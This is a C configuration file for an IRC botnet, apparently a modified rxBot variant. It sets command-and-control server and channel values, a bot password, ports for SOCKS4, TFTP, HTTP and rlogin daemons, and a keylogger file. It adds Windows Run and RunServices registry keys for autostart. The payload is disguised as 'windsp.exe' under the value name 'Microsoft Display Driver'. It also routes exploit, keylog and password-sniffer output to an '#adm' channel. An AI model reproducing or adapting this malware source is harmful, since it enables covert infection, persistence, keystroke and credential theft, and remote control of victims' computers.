// bot configuration (generic) - doesn't need to be encrypted
int port = 6667;				// server port
int port2 = 6667;				// backup server port
int socks4port = 2001;			// Port # for sock4 daemon to run on  - CHANGE THIS!!!
int tftpport = 69;				// Port # for tftp daemon to run on
int httpport = 5678;			// Port # for http daemon to run on
int rloginport = 514;			// Port # for rlogin daemon to run on
BOOL topiccmd = TRUE;			// set to TRUE to enable topic commands
BOOL rndfilename = FALSE;		// use random file name
BOOL AutoStart = TRUE;			// enable autostart registry keys
char prefix = '!';				// command prefix (one character max.)
int maxrand = 4;				// how many random numbers in the nick
int nicktype = CONSTNICK;		// nick type (see rndnick.h)
BOOL nickprefix = FALSE;			// nick uptime & mirc prefix

#ifdef DEBUG_LOGGING
char logfile[]="%temp%\\yas.jpg";
#endif

#ifndef NO_CRYPT // Only use encrypted strings or your binary will not be secure!!

#else  // Recommended to use this only for Crypt() setup, this is unsecure.

char botid[] = "rx-asn-2-re-worked ";						// bot id
char version[] = "Version 3 Mod by ovelayer";		// Bots !version reply
char password[] = "premium";					// bot password
char server[] = "16";		// server
char serverpass[] = "";						// server password
char channel[] = "#vnc";				// channel that the bot should join
char chanpass[] = "";						// channel password
char server2[] = "irc.";						// backup server (optional)
char channel2[] = "#";						// backup channel (optional)
char chanpass2[] = "";						// backup channel password (optional)
char filename[] = "windsp.exe";			// destination file name
char keylogfile[] = "losg.dat";				// keylog filename
char valuename[] = "Microsoft Display Driver";		// value name for autostart
char nickconst[] = "sym-";					// first part to the bot's nick
char szLocalPayloadFile[]="windsp.exe";	// Payload filename
char modeonconn[] = "-xi+B";					// Can be more than one mode and contain both + and -
char exploitchan[] = "#adm";					// Channel where exploit messages get redirected
char keylogchan[] = "#adm";						// Channel where keylog messages get redirected
char psniffchan[] = "#adm";						// Channel where psniff messages get redirected 

char *authost[] = {
	"*@*.*"
};

char *versionlist[] = {
	"mIRC v6.12 Khaled Mardam-Bey",
};

char regkey1[]="Software\\Microsoft\\Windows\\CurrentVersion\\Run";
char regkey2[]="Software\\Microsoft\\Windows\\CurrentVersion\\RunServices";
char regkey3[]="Software\\Microsoft\\OLE";
char regkey4[]="SYSTEM\\CurrentControlSet\\Control\\Lsa";

#endif

#ifdef PLAIN_CRYPT
char key[16] = "9jah3msnso23kam2"; // CHANGE THIS!!! hmmm..Do I even need this now?
#endif
